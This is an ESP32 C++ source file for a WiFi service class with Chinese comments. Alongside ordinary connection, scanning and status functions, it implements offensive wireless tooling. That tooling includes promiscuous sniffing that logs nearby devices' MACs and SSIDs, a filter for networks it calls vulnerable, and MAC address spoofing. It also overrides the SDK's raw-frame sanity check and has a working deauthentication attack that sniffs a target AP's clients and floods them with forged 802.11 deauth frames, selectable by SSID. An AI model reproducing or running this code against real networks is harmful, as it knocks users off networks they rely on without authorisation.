#include "WifiService.h"

// 静态成员变量定义
std::vector<std::string> WifiService::sniffLog;          // WiFi嗅探日志容器
portMUX_TYPE WifiService::sniffMux = portMUX_INITIALIZER_UNLOCKED; // 嗅探日志线程锁

std::vector<std::array<uint8_t, 6>> WifiService::staList; // Deauth攻击时捕获的STA客户端列表
uint8_t WifiService::apBSSID[6];                          // 目标AP的BSSID
portMUX_TYPE WifiService::staMux = portMUX_INITIALIZER_UNLOCKED; // STA列表线程锁

/**
 * @brief 构造函数：初始化WiFi为STA模式
 */
WifiService::WifiService() : connected(false) {
    WiFi.mode(WIFI_STA);
}

/**
 * @brief 连接指定WiFi网络
 * @param ssid WiFi名称
 * @param password WiFi密码（开放网络传空字符串）
 * @param timeoutMs 连接超时时间（毫秒）
 * @return 连接成功返回true，超时/失败返回false
 */
bool WifiService::connect(const std::string& ssid, const std::string& password, unsigned long timeoutMs) {
    WiFi.begin(ssid.c_str(), password.c_str());

    unsigned long startAttemptTime = millis();
    // 等待连接完成或超时
    while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < timeoutMs) {
        delay(100);
    }

    connected = WiFi.status() == WL_CONNECTED;
    return connected;
}

/**
 * @brief 断开当前WiFi连接并清除配置
 */
void WifiService::disconnect() {
    WiFi.disconnect(true); // true表示清除保存的WiFi配置
    connected = false;
}

/**
 * @brief 检查是否已连接到WiFi网络
 * @return 已连接返回true，否则返回false
 */
bool WifiService::isConnected() const {
    return WiFi.status() == WL_CONNECTED;
}

/**
 * @brief 获取STA模式下的本地IP地址
 * @return IP地址字符串（如"192.168.1.100"）
 * @note 与getLocalIp()函数重复，保留以兼容原有调用
 */
std::string WifiService::getLocalIP() const {
    return WiFi.localIP().toString().c_str();
}

/**
 * @brief 根据当前WiFi模式获取对应IP地址
 * @return AP模式返回软AP IP，STA/AP_STA模式返回STA IP
 */
std::string WifiService::getCurrentIP() const {
    if (WiFi.getMode() == WIFI_AP || WiFi.getMode() == WIFI_AP_STA) {
        return WiFi.softAPIP().toString().c_str();
    }
    return WiFi.localIP().toString().c_str();
}

/**
 * @brief 获取子网掩码
 * @return 子网掩码字符串（如"255.255.255.0"）
 */
std::string WifiService::getSubnetMask() const {
    return std::string(WiFi.subnetMask().toString().c_str());
}

/**
 * @brief 获取网关IP地址
 * @return 网关IP字符串
 */
std::string WifiService::getGatewayIp() const {
    return std::string(WiFi.gatewayIP().toString().c_str());
}

/**
 * @brief 获取主DNS服务器IP（DNS1）
 * @return DNS1 IP字符串
 */
std::string WifiService::getDns1() const {
    return std::string(WiFi.dnsIP(0).toString().c_str());
}

/**
 * @brief 获取备用DNS服务器IP（DNS2）
 * @return DNS2 IP字符串
 */
std::string WifiService::getDns2() const {
    return std::string(WiFi.dnsIP(1).toString().c_str());
}

/**
 * @brief 获取当前WiFi主机名
 * @return 主机名字符串（空表示未设置）
 */
std::string WifiService::getHostname() const {
    const char* h = WiFi.getHostname();
    return std::string(h ? h : "");
}

/**
 * @brief 获取软AP模式下的IP地址
 * @return AP IP字符串（如"192.168.4.1"）
 */
std::string WifiService::getApIp() const {
    return std::string(WiFi.softAPIP().toString().c_str());
}

/**
 * @brief 获取当前连接WiFi的信号强度（RSSI）
 * @return RSSI值（单位：dBm，值越大信号越好，如-50 > -80）
 */
int WifiService::getRssi() const {
    return WiFi.RSSI();
}

/**
 * @brief 获取当前连接WiFi的信道
 * @return 信道号（1-13）
 */
int WifiService::getChannel() const {
    return WiFi.channel();
}

/**
 * @brief 获取WiFi工作模式的原始数值
 * @return 模式值（WIFI_MODE_STA=1, WIFI_MODE_AP=2, WIFI_MODE_APSTA=3）
 */
int WifiService::getWifiModeRaw() const {
    return static_cast<int>(WiFi.getMode());
}

/**
 * @brief 获取WiFi连接状态的原始数值
 * @return 状态值（WL_CONNECTED=3, WL_DISCONNECTED=6等）
 */
int WifiService::getWifiStatusRaw() const {
    return static_cast<int>(WiFi.status());
}

/**
 * @brief 检查是否启用了WiFi配网功能（Provisioning）
 * @return 启用返回true，否则返回false
 */
bool WifiService::isProvisioningEnabled() const {
    return WiFi.isProvEnabled();
}

/**
 * @brief 获取当前连接WiFi的SSID
 * @return SSID字符串
 */
std::string WifiService::getSsid() const {
    return std::string(WiFi.SSID().c_str()); 
}

/**
 * @brief 获取当前连接WiFi的BSSID（MAC地址）
 * @return BSSID字符串（格式：XX:XX:XX:XX:XX:XX）
 */
std::string WifiService::getBssid() const {
    return std::string(WiFi.BSSIDstr().c_str());
}

/**
 * @brief 创建软AP（WiFi热点）
 * @param ssid AP名称
 * @param password AP密码（空表示开放热点）
 * @param channel 信道（1-13）
 * @param maxConn 最大连接数（1-4）
 * @return 创建成功返回true，失败返回false
 */
bool WifiService::startAccessPoint(const std::string& ssid, const std::string& password, int channel, int maxConn) {
    // 开放热点（无密码）
    if (password.empty()) {
        return WiFi.softAP(ssid.c_str(), nullptr, channel, false, maxConn);
    } else {
        // 加密热点（WPA2-PSK）
        return WiFi.softAP(ssid.c_str(), password.c_str(), channel, false, maxConn);
    }
}

/**
 * @brief 重置WiFi状态（断开连接，恢复为STA模式）
 */
void WifiService::reset() {
    disconnect();
    WiFi.mode(WIFI_STA);
    connected = false;
}

/**
 * @brief 设置WiFi为AP+STA双模
 */
void WifiService::setModeApSta() {
    WiFi.mode(WIFI_AP_STA);
}

/**
 * @brief 设置WiFi为仅AP模式
 */
void WifiService::setModeApOnly() {
    WiFi.mode(WIFI_AP);
}

/**
 * @brief 获取STA模式下的本地IP地址（与getLocalIP重复，保留兼容）
 * @return IP地址字符串
 */
std::string WifiService::getLocalIp() const {
    String ip = WiFi.localIP().toString();
    return std::string(ip.c_str());
}

/**
 * @brief 扫描周边WiFi网络（仅返回SSID列表）
 * @return 包含所有SSID的字符串列表（隐藏网络显示空字符串）
 */
std::vector<std::string> WifiService::scanNetworks() {
    std::vector<std::string> results;

    // 同步扫描（async=false），包含隐藏网络（hidden=true）
    int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true);

    for (int i = 0; i < n; ++i) {
        results.push_back(WiFi.SSID(i).c_str());
    }

    return results;
}

/**
 * @brief 详细扫描周边WiFi网络（包含加密类型、BSSID、RSSI等）
 * @return 包含WiFiNetwork结构体的列表
 */
std::vector<WiFiNetwork> WifiService::scanDetailedNetworks() {
    std::vector<WiFiNetwork> networks;
    int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true);

    for (int i = 0; i < n; i++) {
        WiFiNetwork network;
        network.ssid = WiFi.SSID(i).c_str();
        if (network.ssid.empty()) network.ssid = "隐藏SSID"; // 隐藏网络标记
        network.rssi = WiFi.RSSI(i);                        // 信号强度
        network.encryption = WiFi.encryptionType(i);        // 加密类型
        network.open = (network.encryption == WIFI_AUTH_OPEN); // 是否开放网络
        network.vulnerable = isVulnerable(network.encryption); // 是否易受攻击

        // 格式化BSSID为XX:XX:XX:XX:XX:XX
        char mac[18];
        uint8_t* bssid = WiFi.BSSID(i);
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 bssid[0], bssid[1], bssid[2],
                 bssid[3], bssid[4], bssid[5]);
        network.bssid = mac;

        network.channel = WiFi.channel(i);          // 信道
        network.hidden = (network.ssid == "隐藏SSID"); // 是否隐藏网络

        networks.push_back(network);
    }

    return networks;
}

/**
 * @brief 从扫描结果中筛选开放网络（无密码）
 * @param networks 详细扫描结果列表
 * @return 仅包含开放网络的列表
 */
std::vector<WiFiNetwork> WifiService::getOpenNetworks(const std::vector<WiFiNetwork>& networks) {
    std::vector<WiFiNetwork> open;
    for (auto net : networks) {
        if (net.open) open.push_back(net);
    }
    return open;
}

/**
 * @brief 判断加密类型是否易受攻击（WEP/WPA-PSK）
 * @param encryption 加密类型
 * @return 易受攻击返回true，否则返回false
 */
bool WifiService::isVulnerable(wifi_auth_mode_t encryption) const {
    // WEP和WPA-PSK加密算法存在安全漏洞
    return encryption == WIFI_AUTH_WEP || encryption == WIFI_AUTH_WPA_PSK;
}

/**
 * @brief 从扫描结果中筛选易受攻击的网络（WEP/WPA-PSK）
 * @param networks 详细扫描结果列表
 * @return 仅包含易受攻击网络的列表
 */
std::vector<WiFiNetwork> WifiService::getVulnerableNetworks(const std::vector<WiFiNetwork>& networks) {
    std::vector<WiFiNetwork> vuln;
    for (auto net : networks) {
        if (net.encryption == WIFI_AUTH_WEP || net.encryption == WIFI_AUTH_WPA_PSK) {
            WiFiNetwork copy = net;
            copy.vulnerable = true;
            vuln.push_back(copy);
        }
    }
    return vuln;
}

/**
 * @brief 将WiFi加密类型转换为可读字符串
 * @param enc 加密类型枚举值
 * @return 加密类型的中文描述字符串
 */
std::string WifiService::encryptionTypeToString(wifi_auth_mode_t enc) {
    switch (enc) {
        case WIFI_AUTH_OPEN: return "开放";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA+WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-企业版";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2+WPA3";
        case WIFI_AUTH_WAPI_PSK: return "WAPI";
        default: return "未知";
    }
}

/**
 * @brief 启动WiFi被动嗅探（混杂模式）
 * @note 嗅探所有WiFi帧，记录帧类型、RSSI、信道、MAC、SSID等信息
 */
void WifiService::startPassiveSniffing() {
    disconnect(); // 断开当前WiFi连接

    // 重置混杂模式配置
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    if (isConnected()) {
        esp_wifi_deinit(); // 反初始化WiFi
    }
    delay(300); // 等待硬件稳定

    // 重新初始化WiFi并启动混杂模式
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_start();

    esp_wifi_set_promiscuous(true); // 启用混杂模式
    esp_wifi_set_promiscuous_rx_cb(&WifiService::snifferCallback); // 设置嗅探回调
}

/**
 * @brief 停止WiFi被动嗅探
 * @note 关闭混杂模式，清空嗅探日志，恢复为STA模式
 */
void WifiService::stopPassiveSniffing() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_stop();
    esp_wifi_deinit();
    sniffLog.clear(); // 清空嗅探日志
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
}

/**
 * @brief WiFi嗅探回调函数（混杂模式下接收所有帧）
 * @param buf 帧数据缓冲区
 * @param 帧类型（未使用）
 */
void WifiService::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t) {
    const wifi_promiscuous_pkt_t* pkt = reinterpret_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    int8_t rssi = pkt->rx_ctrl.rssi; // 信号强度
    uint8_t ch = pkt->rx_ctrl.channel; // 信道

    uint8_t type = 0, subtype = 0;
    extractTypeSubtype(payload, type, subtype); // 解析帧类型/子类型
    std::string typeStr = getFrameTypeName(type, subtype); // 转换为可读名称
    std::string macStr = formatMac(payload + 10); // 格式化MAC地址

    // 构建嗅探日志行
    std::string line = "信道:" + std::to_string(ch) +
                       " 信号强度:" + std::to_string(rssi) +
                       " 帧类型:" + typeStr;

    // 提取SSID（仅管理帧的Probe Req/Beacon帧包含SSID）
    if (type == 0 && (subtype == 8 || subtype == 4)) {
        std::string ssid = parseSsidFromPacket(payload, len, type, subtype);
        if (!ssid.empty()) {
            line += " SSID:\"" + ssid + "\"";
        }
    }

    line += " MAC:" + macStr;

    // 线程安全添加日志（最多存储200条）
    portENTER_CRITICAL(&sniffMux);
    if (sniffLog.size() < 200) sniffLog.push_back(line);
    portEXIT_CRITICAL(&sniffMux);
}

/**
 * @brief 获取并清空嗅探日志（线程安全）
 * @return 当前所有嗅探日志行
 */
std::vector<std::string> WifiService::getSniffLog() {
    std::vector<std::string> copy;

    portENTER_CRITICAL(&sniffMux);
    copy.swap(sniffLog); // 高效交换并清空原日志
    portEXIT_CRITICAL(&sniffMux);

    return copy;
}

/**
 * @brief 切换WiFi嗅探信道
 * @param channel 目标信道（1-13）
 * @return 切换成功返回true，失败返回false
 */
bool WifiService::switchChannel(uint8_t channel) {
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    return err == ESP_OK;
}

/**
 * @brief 将6字节MAC地址格式化为XX:XX:XX:XX:XX:XX字符串
 * @param mac 6字节MAC地址数组
 * @return 格式化后的MAC字符串
 */
std::string WifiService::formatMac(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(buf);
}

/**
 * @brief 从帧数据中提取帧类型和子类型
 * @param payload 帧数据缓冲区
 * @param type 输出：帧类型（0=管理帧，1=控制帧，2=数据帧）
 * @param subtype 输出：子类型
 * @return 类型/子类型字符串（如"0/8"）
 */
std::string WifiService::getFrameTypeSubtype(const uint8_t* payload, uint8_t& type, uint8_t& subtype) {
    uint16_t fc = payload[0] | (payload[1] << 8); // 帧控制字段
    type = (fc & 0x000C) >> 2;    // 提取类型（bit2-3）
    subtype = (fc & 0x00F0) >> 4; // 提取子类型（bit4-7）
    return std::to_string(type) + "/" + std::to_string(subtype);
}

/**
 * @brief 从WiFi帧中解析SSID（仅管理帧有效）
 * @param payload 帧数据缓冲区
 * @param len 帧长度
 * @param type 帧类型
 * @param subtype 帧子类型
 * @return SSID字符串（空表示未找到）
 */
std::string WifiService::parseSsidFromPacket(const uint8_t* payload, int len, uint8_t type, uint8_t subtype) {
    int offset = 24;
    if (type == 0 && subtype == 8) offset = 36; // Beacon帧SSID偏移不同

    // 遍历IE元素查找SSID（IE ID=0）
    while (offset + 2 <= len) {
        uint8_t id = payload[offset];      // IE ID
        uint8_t elen = payload[offset + 1];// IE长度
        if (offset + 2 + elen > len) break;

        if (id == 0) { // SSID的IE ID为0
            return std::string(reinterpret_cast<const char*>(payload + offset + 2), elen);
        }

        offset += 2 + elen; // 移动到下一个IE元素
    }

    return "";
}

/**
 * @brief 将帧类型/子类型转换为可读名称
 * @param type 帧类型（0=管理帧，1=控制帧，2=数据帧）
 * @param subtype 帧子类型
 * @return 帧类型的中文描述
 */
std::string WifiService::getFrameTypeName(uint8_t type, uint8_t subtype) {
    if (type == 0) { // 管理帧
        switch (subtype) {
            case 0:  return "关联请求";
            case 1:  return "关联响应";
            case 4:  return "探测请求";
            case 5:  return "探测响应";
            case 8:  return "信标帧";
            case 10: return "解除关联";
            case 11: return "认证";
            case 12: return "解除认证";
            default: return "管理帧/" + std::to_string(subtype);
        }
    } else if (type == 1) { // 控制帧
        return "控制帧/" + std::to_string(subtype);
    } else if (type == 2) { // 数据帧
        if (subtype == 0) return "数据帧";
        if (subtype == 4) return "空数据帧";
        return "数据帧/" + std::to_string(subtype);
    }
    return "未知帧";
}

/**
 * @brief 从帧数据中提取类型和子类型（简化版）
 * @param payload 帧数据缓冲区
 * @param type 输出：帧类型
 * @param subtype 输出：子类型
 */
void WifiService::extractTypeSubtype(const uint8_t* payload, uint8_t& type, uint8_t& subtype) {
    uint16_t fc = payload[0] | (payload[1] << 8);
    type = (fc & 0x0C) >> 2;
    subtype = (fc & 0xF0) >> 4;
}

/**
 * @brief 欺骗MAC地址（修改STA/AP的MAC）
 * @param macStr 目标MAC地址（格式：XX:XX:XX:XX:XX:XX）
 * @param which 修改的接口（Station/AP）
 * @return 修改成功返回true，失败返回false
 */
bool WifiService::spoofMacAddress(const std::string& macStr, MacInterface which) {
    if (macStr.length() != 17) return false; // MAC格式错误

    uint8_t mac[6];
    int values[6];
    // 解析MAC字符串为6个字节
    if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) != 6) {
        return false;
    }

    for (int i = 0; i < 6; ++i)
        mac[i] = static_cast<uint8_t>(values[i]);

    mac[0] &= 0xFE; // 清除广播位，设置为单播

    WiFi.disconnect(true);
    delay(100);

    // 转换接口类型
    wifi_interface_t iface = (which == MacInterface::Station) ? WIFI_IF_STA : WIFI_IF_AP;

    // 设置对应WiFi模式
    if (iface == WIFI_IF_STA) {
        WiFi.mode(WIFI_MODE_STA);
    } else {
        WiFi.mode(WIFI_MODE_AP);
    }

    // 修改MAC地址
    esp_err_t err = esp_wifi_set_mac(iface, mac);
    if (err != ESP_OK) {
        return false;
    }

    esp_wifi_start();
    return true;
}

/**
 * @brief 获取STA接口的MAC地址
 * @return 格式化后的MAC字符串
 */
std::string WifiService::getMacAddressSta() const {
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    return formatMac(mac);
}

/**
 * @brief 获取AP接口的MAC地址
 * @return 格式化后的MAC字符串
 */
std::string WifiService::getMacAddressAp() const {
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, mac);
    return formatMac(mac);
}

/**
 * @brief 重写IEEE802.11原始帧校验函数（避免链接错误）
 * @return 始终返回0（跳过校验）
 */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t)
{
    return 0;
}

/**
 * @brief Deauth攻击的客户端嗅探回调函数
 * @param buf 帧数据缓冲区
 * @param type 帧类型
 * @note 仅捕获目标AP的客户端数据帧，记录STA MAC
 */
void WifiService::clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return; // 仅处理数据帧

    const wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* hdr = p->payload;

    // 筛选To-DS=1、From-DS=0的帧（STA→AP）
    if ((hdr[1] & 0x03) != 0x01) return;

    const uint8_t* ap  = hdr + 4;   // AP的MAC（addr1）
    const uint8_t* sta = hdr +10;   // STA的MAC（addr2）

    if (memcmp(ap, apBSSID, 6) != 0) return;   // 非目标AP，跳过

    // 记录未重复的STA MAC
    std::array<uint8_t,6> mac;
    memcpy(mac.data(), sta, 6);

    portENTER_CRITICAL_ISR(&staMux);
    bool seen=false;
    for (auto& e : staList) if (e == mac) { seen=true; break; }
    if (!seen) staList.push_back(mac);
    portEXIT_CRITICAL_ISR(&staMux);
}

/**
 * @brief 发送Deauth攻击帧（解除认证）
 * @param bssid 目标AP的BSSID
 * @param channel 目标信道
 * @param bursts 攻击包发送次数
 * @param sniffMs 客户端嗅探时长（毫秒）
 * @note 先嗅探客户端，再向AP和所有客户端发送Deauth帧
 */
void WifiService::deauthAttack(const uint8_t bssid[6], uint8_t channel, uint8_t bursts, uint32_t sniffMs)
{
    // 确保WiFi为AP/APSTA模式
    if (WiFi.getMode() != WIFI_MODE_AP && WiFi.getMode() != WIFI_MODE_APSTA) {
        WiFi.mode(WIFI_MODE_AP);
        esp_wifi_start();
    }

    std::vector<std::array<uint8_t,6>> clients;

    // 初始化目标AP信息，清空客户端列表
    memcpy(apBSSID, bssid, 6);
    staList.clear();

    // 切换到目标信道，启动客户端嗅探
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&clientSnifferCallback);

    // 嗅探客户端
    uint32_t start = millis();
    while (millis() - start < sniffMs) delay(1);

    // 停止嗅探，获取客户端列表
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    portENTER_CRITICAL(&staMux);
    clients = staList;
    portEXIT_CRITICAL(&staMux);

    // 构建Deauth帧（802.11解除认证帧）
    uint8_t pkt[26] = {
        0xc0,0x00,                          // 帧控制：解除认证帧
        0x00,0x00,                          // 持续时间
        0xff,0xff,0xff,0xff,0xff,0xff,      // 目标MAC（广播）
        0x00,0x00,0x00,0x00,0x00,0x00,      // 源MAC（AP）
        0x00,0x00,0x00,0x00,0x00,0x00,      // BSSID（AP）
        0x00,0x00,                          // 分片&序列号
        0x02,0x00                           // 原因码：先前的认证失效
    };
    memcpy(&pkt[16], bssid, 6);            // BSSID设为目标AP

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // 发送Deauth帧
    for (int i=0;i<bursts;i++) {
        // 向广播地址发送（影响所有客户端）
        memcpy(&pkt[10], bssid, 6);        // 源MAC=AP
        memcpy(&pkt[4] , "\xff\xff\xff\xff\xff\xff",6); // 目标=广播
        esp_wifi_80211_tx(WIFI_IF_AP,pkt,26,true);

        // 向每个捕获的客户端发送
        for (auto& sta: clients) {
            memcpy(&pkt[4],  sta.data(),6);  // 目标MAC=STA
            esp_wifi_80211_tx(WIFI_IF_AP,pkt,26,true);
        }
        delay(1);
    }
}

/**
 * @brief 通过SSID对目标AP执行Deauth攻击
 * @param ssid 目标AP的SSID
 * @return 找到AP并攻击成功返回true，未找到返回false
 * @note 固定发送30次攻击包，嗅探400ms客户端
 */
bool WifiService::deauthApBySsid(const std::string& ssid)
{
    auto nets = scanDetailedNetworks();
    for (auto& n : nets) {
        if (n.ssid == ssid) {
            // 解析BSSID字符串为字节数组
            uint8_t bssid[6];
            sscanf(n.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
            // 执行Deauth攻击
            deauthAttack(bssid, n.channel, 30, 400);
            return true;
        }
    }
    return false; // 未找到指定SSID的AP
}